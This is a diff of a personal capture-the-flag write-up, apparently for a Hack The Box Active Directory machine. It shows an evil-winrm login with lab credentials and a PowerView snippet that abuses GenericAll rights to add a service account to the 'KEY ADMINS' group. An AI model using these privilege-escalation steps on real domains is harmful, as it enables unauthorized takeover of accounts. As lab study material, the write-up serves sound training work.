@@ -118,14 +118,19 @@ evil-winrm -p 's3rvice' -u 'svc-alfresco' -i 10.10.10.161
 
 >[!warning] I recommed to use SharpHound.exe last version, becasuse [[bloodhaund-python]] didn't report me the correct path
 
-- we can abuse "GenericALL", [info](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/acl-persistence-abuse/index.html#genericall-rights-on-group) get into 'KEY ADMINS' group, there are 2 ways, using `net.exe` (not recomended way) or using [[PowerView]] (recomended way)
+- we can abuse "GenericALL", [info](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/acl-persistence-abuse/index.html#genericall-rights-on-group) get into 'KEY ADMINS' group, there are 2 ways, using `net.exe` (not recommended way) or using [[PowerView]] (recommended way)
+>[!warning] You may need to authenticate to the Domain Controller as a member of ACCOUNT OPERATORS@HTB.LOCAL
+
 ```bash
 . .\PowerView.ps1
 
-Add-DomainGroupMember -Identity 'KEY ADMINS' -Members svc-alfresco
-
+$SecPassword = ConvertTo-SecureString 's3rvice' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('htb.local\svc-alfresco', $SecPassword)
+Add-DomainGroupMember -Identity 'KEY ADMINS' -Members 'svc-alfresco' -Credential $Cred
 Get-DomainGroupMember -Identity 'KEY ADMINS'
 ```
 >[!example]- Result
->![[Pasted image 20250313004249.png]]
+>![[Pasted image 20250313100713.png]]
+
+
 
